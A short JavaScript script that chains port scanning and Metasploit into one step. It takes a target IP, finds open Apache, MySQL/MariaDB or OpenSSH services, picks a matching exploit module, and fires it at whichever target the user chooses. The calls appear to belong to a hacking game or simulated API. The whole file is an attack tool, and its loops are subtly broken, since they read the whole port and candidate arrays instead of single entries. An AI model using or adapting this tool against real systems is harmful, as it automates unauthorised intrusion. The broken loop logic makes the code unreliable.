// This is thee scipt used to save time from doing Nmap and Metasploit, but do it all at once instead

// =============== Searching ===============

function getSearchKeyword(versionStr) {
var v = versionStr.toLowerCase();
if (v.includes("apache")) return "apache";
if (v.includes("mariadb")) return "mariadb";
if (v.includes("mysql")) return "mysql";
if (v.includes("openssh")) return "openssh";
return null;
}

function getPureVersion(versionStr) {
if (!versionStr) return "1.0.0";
var s = versionStr.trim();
var match = s.match(/\d+\.\d+(?:\.\d+)*/);
return match ? match[0] : "1.0.0";
}

// filter out the correct module with the correct wording
function filterBestModule(modules, keyword) {
if (keyword === "openssh") {
return modules.find(m => m.name.includes("/ssh/")) || modules[0];
} else if (keyword === "apache") {
return modules.find(m => m.name.includes("/apache/")) || modules[0];
} else if (keyword === "mariadb" || keyword === "mysql") {
return modules.find(m => m.name.includes("/mysql/")) || modules[0];
}
return modules[0]; // return value
}

// =============== Attacking ===============
async function performAttack(ip, port, moduleName, version) {
const msf = GetMetasploit();
println("\n🔧 Now using: " + moduleName);

await msf.Use(moduleName);
await msf.SetOption("RHOST", ip);
await msf.SetOption("RPORT", port.toString());
await msf.SetOption("VERSION", version);

try {
await msf.Exploit();
println("✅ DOOM！");
} catch (e) {
println("❌ Exploit failed: " + e);
}
}

// =============== Main Process ===============
async function Main() {
var ip = await prompt("Please enter the target IP：");
if (!Networking.IsIp(ip)) {
println("❌ Invalid IP");
return;
}

var subnet = await Networking.GetSubnet(ip);
if (!subnet) {
println("❌ Unable to obtain subnet information");
return;
}

var ports = await subnet.GetPorts();
if (!ports || ports.length === 0) {
println("⚠️ Target didnot have any open port");
return;
}

// Gardering all attack-able services
/** @type {{port: number, keyword: string, version: string, module: string}[]} */
var candidates = /** @type {any[]} */ ([]);

for (var i = 0; i < ports.length; i++) {
var p = ports;
if (!(await subnet.PingPort(p))) continue;

var data = await subnet.GetPortData(p);
if (!data || !data.version) continue;

var kw = getSearchKeyword(data.version);
if (!kw) continue;

var ver = getPureVersion(data.version);

// Searching module
const msf = GetMetasploit();
var modules = await msf.Search(kw);
if (modules.length === 0) continue;

var bestModule = filterBestModule(modules, kw);
candidates.push({
port: p,
keyword: kw,
version: ver,
module: bestModule.name
});
}

// No Awaiting Target
if (candidates.length === 0) {
println("🔒 Unable to find any usable services（Apache / OpenSSH / MySQL ...etc）");
return;
}

// Show Awaiting target list
println("\n🎯 Found " + candidates.length + " Attack-able Target：");
for (var i = 0; i < candidates.length; i++) {
var c = candidates;
println("[" + i + "] " + c.keyword + " @ " + c.port + " (v" + c.version + ")");
println(" Module: " + c.module);
}

// User choices
var choice = await prompt("\nPlease input the number of target you need to attack：");
var idx = parseInt(choice);

if (isNaN(idx) || idx < 0 || idx >= candidates.length) {
println("❌ Invalid choice无效选择");
return;
}

var target = candidates[idx];
println("\n👉 You've selected: [" + idx + "] " + target.keyword + " @ " + target.port);

// Perform Attack
await performAttack(ip, target.port, target.module, target.version);
}

// =============== Start Function ===============
Main();
